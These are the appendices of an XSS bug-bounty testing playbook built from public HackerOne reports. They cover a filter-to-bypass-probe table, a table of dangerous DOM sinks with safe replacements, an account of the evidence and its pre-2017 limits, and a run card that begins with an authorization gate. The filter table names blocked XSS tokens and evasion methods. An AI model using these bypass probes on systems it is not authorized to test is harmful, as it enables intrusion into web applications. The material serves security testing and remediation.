| Filter you observe | Probe family |
| --- | --- |
| Blocklist of `<` `>` | §8.3 Unicode |
| Blocklist of substrings (`onerror=`, `alert`, `javascript:`) | case, entities, whitespace, split tokens |
| Regex tag-strip | §8.4 non-match probes |
| Single-pass encoder | §8.2 encoding depth |
| Allow-list parser | DTD/entities, CDATA, namespaces, encoding declarations |
| One-shot HTML escape, wrong context | §8.1 row for the actual context |

---

## Appendix B — Sink Reference

| Sink | Dangerous | Safe replacement |
| --- | --- | --- |
| `innerHTML` / `outerHTML` | any markup | `textContent` |
| `insertAdjacentHTML` | any markup | `insertAdjacentText` |
| `document.write` | any markup | `createElement` + `textContent` |
| jQuery `.html()` / `.append()` | any markup | `.text()` |
| `location` / `location.href =` | `javascript:`, `data:` | scheme allow-list |
| `eval` / `new Function` / `setTimeout("…")` | arbitrary code | pass a function reference |
| `_.template(userInput)` | eval primitive | bind as a variable value |
| `<a href>` by concatenation | attribute break-out | `setAttribute` after validation |
| `mailto:` / `tel:` body | header injection | strip CR/LF |

---

## Appendix C — Evidence Base and Its Limits

This playbook's techniques are derived from **562 public HackerOne reports across 80
programs**, catalogued in [`references/source-index.md`](references/source-index.md).
A second corpus supplements it: **207 disclosed FirstBlood hackevent reports on
BugBountyHunter.com** (event-triaged, every body retrieved), catalogued in
[`references/firstblood-index.md`](references/firstblood-index.md). Its distinctive
contributions: logged-metadata blind XSS (C13), hidden store-time parameters (C14),
and the filter-reconnaissance probes in the canonical filter playbook.

| Evidence level | Count |
| --- | --- |
| Full researcher report body retrieved | 459 |
| Program's official disclosure summary only (body withheld) | 103 |
| Title-only | 0 |

A further **299 XSS-titled archive entries returned HTTP 404** and could not be
retrieved at all; they are recorded, not reconstructed.

**Limits you must respect:**

1. **Everything predates 12 September 2017.** Flash is removed, CSP is mainstream, and
   DOM parsing has changed. Techniques here are historical evidence of *method*; re-test
   behaviour, never assume it.
2. **IE-era techniques may be inert.** Several corpus reports are IE-specific (`expression()`,
   `X-UA-Compatible IE=9`, MIME sniffing). Verify on a current browser.
3. **Severities are program-specific and not comparable across programs.** Use them as
   anchors for *reasoning*, not as targets.
4. **Payloads in the canonical playbooks are evidence, not tooling.** They are quoted
   verbatim to document what was reported, and several are unusable today.
5. **No post-2017 techniques are covered here:** Trusted Types, MV3 extensions, modern
   SSR framework injection, `setHTMLUnsafe`/`Element.setHTML`, and mutation XSS. Treat
   these as gaps to research independently.

---

## Appendix D — Quick Reference: One-Page Run Card

```
0  AUTHORIZE ................ gate: in-scope basis per target
1  MAP ....................... params, bundles, sinks, non-browser sinks
2  REFLECT ................... marker per param, byte offset, DOM check
3  CLASSIFY .................. gate: exactly one context C1..C14
4  ROUTE ..................... R1 reflect · R2 store · R3 DOM · R4 self
                              R5 upload · R6 template · R7 ext/msg · R8 filter
5  ESCALATE .................. gate: 6-step ladder, stop at first success
6  VALIDATE .................. gate: V1-V11 all pass
7  SEVERITY .................. name the viewer; disclose CSP, cookies, chains
8  REPORT .................... context in title, staged PoC, raw evidence
9  REGRESSION ................ context-correct fix + test suite
10 DONE ...................... gate: reproducible without asking you anything
```

**Three rules that decide most outcomes:**
1. Classify the context before choosing a payload.
2. Report the highest rung you *reached*, not the one you *wanted*.
3. Disclose every limitation yourself.

---

*Compiled 2026-10-12 from 562 public HackerOne reports. Archive accessed 2026-10-12;
archive last updated 2017-09-12. Deep-dive companions:
[`Reflected-XSS.md`](Reflected-XSS.md) · [`Stored-XSS.md`](Stored-XSS.md) ·
[`DOM-Based-XSS.md`](DOM-Based-XSS.md) · [`Context-Based-XSS.md`](Context-Based-XSS.md) ·
[`Filter-Bypass-and-Encoding.md`](Filter-Bypass-and-Encoding.md) ·
[`Framework-and-Template-XSS.md`](Framework-and-Template-XSS.md) ·
[`File-Upload-and-SVG-XSS.md`](File-Upload-and-SVG-XSS.md) ·
[`Self-XSS.md`](Self-XSS.md) · [`HTML-Injection.md`](HTML-Injection.md) ·
[`Browser-Extension-and-Messaging-XSS.md`](Browser-Extension-and-Messaging-XSS.md)*
